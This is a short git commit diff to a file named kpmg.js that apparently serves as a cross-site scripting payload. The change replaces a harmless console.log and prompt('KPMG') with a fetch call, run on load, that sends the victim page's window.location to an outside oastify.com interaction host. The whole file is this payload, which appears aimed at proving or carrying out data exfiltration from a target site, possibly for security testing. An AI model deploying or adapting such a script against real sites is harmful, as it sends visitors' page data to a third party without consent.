62ad10850bc19d9148d4b729f51b1f5ab08a385f
lilzdotgovph <108351739+lilzdotgovph@users.noreply.github.com>
2025-02-12 17:26:30 +0800

    Update kpmg.js

--- kpmg.js
+++ kpmg.js
@@ -1,6 +1,9 @@
 function MyFunc(){
-  console.log(window.location);
-  prompt("KPMG");
+  var p = window.location;
+  fetch(`https://kma9r45df9fnmii0r0z9if20vr1iped3.oastify.com/p?param=${encodeURIComponent(p)}`)
+    .then(response => response.json()) // If expecting JSON response
+    .then(data => console.log(data))
+    .catch(error => console.error("Error:", error));
 }
 
 MyFunc();
